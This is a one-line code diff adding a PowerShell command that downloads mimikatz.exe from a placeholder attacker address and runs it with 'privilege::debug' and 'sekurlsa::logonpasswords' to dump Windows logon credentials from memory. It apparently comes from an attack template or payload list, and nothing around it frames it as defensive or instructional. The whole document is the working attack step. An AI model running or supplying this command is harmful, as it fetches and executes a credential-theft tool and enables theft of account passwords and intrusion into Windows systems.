@@ -1,0 +1,1 @@
+wget http://{ip_attacker}/mimikatz.exe -OutFile mimikatz.exe; .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
